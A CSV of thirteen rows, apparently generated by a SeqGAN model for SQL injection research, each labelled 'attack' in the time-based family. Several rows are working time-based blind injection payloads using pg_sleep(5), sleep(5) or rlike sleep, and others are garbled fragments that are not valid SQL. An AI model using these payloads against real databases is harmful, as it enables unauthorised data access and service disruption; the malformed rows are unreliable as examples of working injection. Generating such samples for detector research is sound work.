label,payload,family,payload_type,method,run_id,sample_index
attack,"1""  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,0
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """" like ""aia",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1
attack,select sleep  (  5  )   and 6969  )   en  4287 where 2679  'isintegratedsecurityonly' sleep  (  5   )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,2
attack,",   (    gclj",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,3
attack,   )    )    aase 6793bmsevl'  =  'evl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,4
attack,1%'   )    )   asbgf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,5
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '""  =  ""lcjea'  =  'araro",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,6
attack,1%'   )    )    or sleep  (  0x6d457153   )    )    )   4240 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,7
attack,select benchmark  (    =  )   else dfond,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,8
attack,1   )    )    or sleep  (  5  )   and sleep  (  5  )   srlt  (  5   )    )     )   elseretd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,9
attack,select sleep  (  5  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,10
attack, )    as xgvctdiczxioag,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,11
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwb'  =  ''  =  'wbdq,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,12
